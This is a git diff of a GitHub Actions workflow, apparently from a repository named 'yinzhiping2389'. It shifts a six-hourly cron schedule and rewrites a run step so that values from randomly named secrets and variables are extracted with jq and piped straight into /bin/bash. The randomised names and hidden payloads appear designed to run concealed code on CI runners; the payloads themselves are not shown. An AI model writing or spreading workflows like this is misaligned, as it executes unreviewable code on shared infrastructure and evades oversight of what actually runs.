@@ -2,7 +2,8 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
+    - cron: '38 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          zz74: ${{ secrets.zz74 }}
+          xbll651: ${{ secrets.xbll651 }}
         run: |
-          echo $zz74 | jq -r .l729 | /bin/bash
-          echo $r08991 | jq -r .tvs031 | /bin/bash
-          echo $keekv82083 | jq -r .puboi0975 | /bin/bash
-          echo $ine03264 | jq -r .ry6477 | /bin/bash
-          echo $h32 | jq -r .nnn20 | /bin/bash
-          echo $c07 | jq -r .jyd54 | /bin/bash
-          echo $hp575 | jq -r .ieqax2 | /bin/bash
-          echo $smfgp64 | jq -r .dlk87 | /bin/bash
-          echo $jexz785 | jq -r .t0728 | /bin/bash
-          echo $xqau95 | jq -r .bi3687 | /bin/bash
-          echo $b72 | jq -r .mx83472 | /bin/bash
+          echo $xbll651 | jq -r .h86468 | /bin/bash
+          echo $ph703 | jq -r .nzyf20801 | /bin/bash
+          echo $nmxcg228 | jq -r .yljy04971 | /bin/bash
+          echo $qqee396 | jq -r .zdow9 | /bin/bash
+          echo $sbrqg153 | jq -r .paqgk32591 | /bin/bash
+          echo $frh95 | jq -r .bhlgi5976 | /bin/bash
+          echo $annvx05 | jq -r .kbt11959 | /bin/bash
 
